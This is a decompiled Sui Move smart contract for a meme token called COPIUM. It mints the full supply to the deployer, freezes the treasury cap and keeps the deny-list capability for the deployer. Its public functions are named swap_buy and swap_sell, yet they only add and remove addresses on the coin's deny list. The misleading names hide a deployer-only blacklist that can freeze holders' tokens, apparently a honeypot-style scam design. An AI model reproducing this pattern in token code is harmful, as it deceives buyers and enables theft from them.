module 0x96acd3b9c73f723b82f134d4ed9fc80103006d977a4337d1fc4f3bdfa18e26c5::copium {
    struct COPIUM has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: COPIUM, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<COPIUM>(arg0, 9, b"COPIUM", b"iykyk", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmUfgGQdzKaNAX1QfZXcnuSiSyknbSvsJy78DreDcnFg1a"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<COPIUM>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<COPIUM>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<COPIUM>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<COPIUM>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<COPIUM>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<COPIUM>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<COPIUM>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<COPIUM>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

